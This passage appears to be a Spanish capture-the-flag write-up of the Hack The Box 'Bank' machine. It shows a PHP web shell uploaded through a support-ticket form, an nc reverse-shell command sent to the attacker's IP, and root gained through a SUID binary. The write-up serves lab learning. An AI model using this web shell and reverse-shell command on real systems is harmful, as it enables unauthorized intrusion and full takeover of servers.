<p>Con esto y con ayuda del pluggin <strong>Foxy Proxy</strong> apuntando al <strong>Burp Suite</strong> vamos a tratar de ingresar al recurso <code class="language-plaintext highlighter-rouge">support.php</code> sin capturar la petición y nos debería aparecer lo siguiente:</p>

<p><img src="/assets/images/htb-bank/bank-web1.png" alt="" /></p>

<p>Ahora, vamos a crear un nuevo ticket y subir un archivo <strong>php</strong> con extensión <strong>htb</strong> con el cual podamos hacer ejecución de comandos, para este caso lo llamaremos <strong>k4mishell.htb</strong>.</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
  <span class="k">echo</span> <span class="s2">"&lt;pre&gt;"</span> <span class="o">.</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s1">'cmd'</span><span class="p">])</span> <span class="o">.</span> <span class="s2">"&lt;/pre&gt;"</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p><img src="/assets/images/htb-bank/bank-web2.png" alt="" /></p>

<p>Le damos click en <strong>Click Here</strong> y nos lleva a nuestro archivo bajo el recurso <code class="language-plaintext highlighter-rouge">/uploads</code> y vemos que podemos ejecutar comandos a nivel de sistema.</p>

<p><img src="/assets/images/htb-bank/bank-web3.png" alt="" /></p>

<p>Ahora vamos a ponernos en escucha por el puerto 443 y vamos a entablarnos una reverse shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://bank.htb/uploads/k4mishell.htb?cmd<span class="o">=</span><span class="nb">nohup </span>nc <span class="nt">-e</span> /bin/bash 10.10.14.27 443 &amp;
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nc <span class="nt">-nlvp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>10.10.14.27] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.29] 42698
<span class="nb">whoami
</span>www-data
</code></pre></div></div>

<p>Para trabajar más comodos vamos a hacer un <a href="/tratamiento-tty">Tratamiento de la tty</a> y vemos que podemos visualizar la flag (user.txt); por lo tanto vamos a enumerar un poco el sistema para ver de que forma nos podemos convertir en <strong>root</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@bank:/home/chris<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
www-data@bank:/home/chris<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>www-data: 
www-data@bank:/home/chris<span class="nv">$ </span><span class="nb">cd</span> /
www-data@bank:/<span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null
./var/htb/bin/emergency
./usr/lib/eject/dmcrypt-get-device
./usr/lib/openssh/ssh-keysign
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/bin/at
./usr/bin/chsh
./usr/bin/passwd
./usr/bin/chfn
./usr/bin/pkexec
./usr/bin/newgrp
./usr/bin/traceroute6.iputils
./usr/bin/gpasswd
./usr/bin/sudo
./usr/bin/mtr
./usr/sbin/uuidd
./usr/sbin/pppd
./bin/ping
./bin/ping6
./bin/su
./bin/fusermount
./bin/mount
./bin/umount
www-data@bank:/<span class="err">$</span>
</code></pre></div></div>

<p>Nos encontramos con el binario <code class="language-plaintext highlighter-rouge">/var/htb/bin/emergency</code> el cual tiene permisos SUID, por lo tanto vamos a probar a ejecutarlo a ver que pasa.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@bank:/<span class="nv">$ </span>/var/htb/bin/emergency
<span class="c"># whoami</span>
root
<span class="c"># </span>
</code></pre></div></div>

<p>Ya somos el usuario <strong>root</strong> y podemos visualizar la flag (root.txt). Si le aplicamos un <code class="language-plaintext highlighter-rouge">strings</code> al binario, vemos que podría hacer multiples cosas y una cadena imprimible en donde se observa <code class="language-plaintext highlighter-rouge">/bin/sh</code>, que es lo que nos despliega al ejecutarlo.</p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#arbitrary-file-upload" class="page__taxonomy-item" rel="tag">Arbitrary_File_Upload</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#php" class="page__taxonomy-item" rel="tag">PHP</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#suid" class="page__taxonomy-item" rel="tag">SUID</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#easy" class="page__taxonomy-item" rel="tag">Easy</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2022-02-28T00:00:00-06:00">February 28, 2022</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/htb-swagshop/" class="pagination--pager" title="Hack The Box SwagShop
">Previous</a>
    
    
      <a href="/htb-cache/" class="pagination--pager" title="Hack The Box Cache
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2022 K4miyo</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
